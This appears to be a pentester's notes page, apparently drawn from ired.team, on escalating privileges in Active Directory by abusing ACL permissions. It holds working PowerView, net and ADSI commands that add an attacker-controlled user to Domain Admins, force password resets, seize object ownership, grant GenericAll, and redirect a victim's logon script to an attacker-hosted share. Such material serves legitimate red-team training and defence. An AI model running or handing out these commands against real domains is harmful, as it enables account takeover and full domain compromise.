Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects (i.e change account name, reset password, etc).
Some of the Active Directory object permissions and types that we as attackers are interested in:
- **GenericAll** - full rights to the object (add users to a group or reset user's password)
- **GenericWrite** - update object's attributes (i.e logon script)
- **WriteOwner** - change object owner to attacker controlled user take over the object
- **WriteDACL** - modify object's ACEs and give attacker full control right over the object
- **AllExtendedRights** - ability to add user to a group or reset password
- **ForceChangePassword** - ability to change user's password
- **Self (Self-Membership)** - ability to add yourself to a group


## GenericAll on User
Using powerview, let's check if our attacking user `spotless` has `GenericAll rights` on the AD object for the user `delegate`:

```
Get-ObjectAcl -SamAccountName eblack -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```

We can see that indeed our user `spotless` has the `GenericAll` rights, effectively enabling the attacker to take over the account:
![[image 3.avif]]
We can reset user's `delegate` password without knowing the current password:
![[image 13.png]]


## GenericAll on Group
Let's see if `Domain admins` group has any weak permissions. First of, let's get its `distinguishedName`:

```
Get-NetGroup "domain admins" -FullData
```
![[image 4.avif]]
```
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
We can see that our attacking user `spotless` has `GenericAll` rights once again:
![[image 5.avif]]Effectively, this allows us to add ourselves (the user `spotless`) to the `Domain Admin` group:

```
net group "domain admins" spotless /add /domain
```

## GenericAll / GenericWrite / Write on Computer
If you have these privileges on a Computer object, you can pull #ResourceBasedConstrainedDelegation off.

## WriteProperty on Group
If our controlled user has `WriteProperty` right on `All` objects for `Domain Admin` group:
![[image 6.avif]]

We can again add ourselves to the `Domain Admins` group and escalate privileges:

```
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```


## Self (Self-Membership) on Group
Another privilege that enables the attacker adding themselves to a group:
![[image 7.avif]]```
```
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## WriteProperty (Self-Membership)
One more privilege that enables the attacker adding themselves to a group:

```
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
![[image 8.avif]]
```
net group "domain admins" spotless /add /domain
```

## ForceChangePassword
If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing their current password:
```
Get-ObjectAcl -SamAccountName USERNAME -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
![[image 14.png]]
Doing the same with powerview:
```
Set-DomainUserPassword -Identity USERNAME -Verbose
```
...or a one liner if no interactive session is not available:
```
Set-DomainUserPassword -Identity USERNAME -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

## WriteOwner on Group
After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`
```
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-LQoECV1FDB-H_F_sZZl%252F-LQoEdTkZ0renZwjI4Y7%252FScreenshot%2520from%25202018-11-08%252016-45-42.png%3Falt%3Dmedia%26token%3D976862eb-ca41-4b9d-8c5d-428b1170b89b&width=768&dpr=4&quality=100&sign=1b06d0e2&sv=1)
...we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:

```
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
```

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-LQoECV1FDB-H_F_sZZl%252F-LQoEw6ju4djFcgir36x%252FScreenshot%2520from%25202018-11-08%252016-54-59.png%3Falt%3Dmedia%26token%3D30f0e2f9-fbdb-4194-8c19-3b00f1ee6648&width=768&dpr=4&quality=100&sign=3f29d387&sv=1)

## GenericWrite on User

```
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](https://www.ired.team/~gitbook/image?url=https%3A%2F%2F386337598-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-legacy-files%2Fo%2Fassets%252F-LFEMnER3fywgFHoroYn%252F-LQohCREBZ7Ian7G7pfx%252F-LQojJ2fBHF5Sd_kfc3V%252FScreenshot%2520from%25202018-11-08%252019-12-04.png%3Falt%3Dmedia%26token%3Da03e9724-1d4c-4616-b02f-b318e8ba374c&width=768&dpr=4&quality=100&sign=e436ed0d&sv=1)

`WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:

```
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

## WriteDACL + WriteOwner

If you are the owner of a group, like I'm the owner of a `Test` AD group:
```
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
![[image 15.png]]
And you have a `WriteDACL` on that AD object:
```
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=test,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
...you can give yourself [`GenericAll`](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-on-group) privileges with a sprinkle of ADSI sorcery:
```
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

Which means you now fully control the AD object:
![[image 9.avif]]This effectively means that you can now add new users to the group.

